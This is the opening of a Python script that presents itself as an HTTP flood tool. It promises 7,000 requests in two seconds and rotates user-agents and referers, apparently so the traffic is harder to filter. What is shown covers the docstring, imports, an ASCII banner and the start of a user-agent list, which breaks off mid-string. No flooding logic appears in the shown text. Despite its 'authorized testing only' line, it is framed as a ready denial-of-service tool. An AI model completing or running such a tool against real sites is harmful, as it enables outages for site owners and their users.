#!/usr/bin/env python3
"""
BURST HTTP FLOOD – High‑performance burst request tool
Sends 7,000 requests in 2 seconds (or any burst) using asyncio.
For authorized testing only.
"""

import asyncio
import aiohttp
import argparse
import random
import sys
import time
from typing import Optional, List
from dataclasses import dataclass

# ========== BANNER ==========
BANNER = """
\033[1;31m
██████╗ ██╗   ██╗██████╗ ███████╗████████╗    ███████╗██╗      ██████╗  ██████╗ ██████╗ 
██╔══██╗██║   ██║██╔══██╗██╔════╝╚══██╔══╝    ██╔════╝██║     ██╔═══██╗██╔═══██╗██╔══██╗
██████╔╝██║   ██║██████╔╝█████╗     ██║       █████╗  ██║     ██║   ██║██║   ██║██║  ██║
██╔══██╗██║   ██║██╔══██╗██╔══╝     ██║       ██╔══╝  ██║     ██║   ██║██║   ██║██║  ██║
██████╔╝╚██████╔╝██║  ██║███████╗   ██║       ██║     ███████╗╚██████╔╝╚██████╔╝██████╔╝
╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝   ╚═╝       ╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ 
\033[1;34m
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;32m
[+] BURST MODE: 7,000 requests in 2 seconds    [+] 3,500 requests per second
[+] ULTRA‑HIGH CONCURRENCY                       [+] REAL‑TIME STATISTICS
[+] RANDOM USER‑AGENTS & REFERERS                 [+] AUTHORIZED TESTING ONLY
\033[1;34m
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[0m
"""

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko
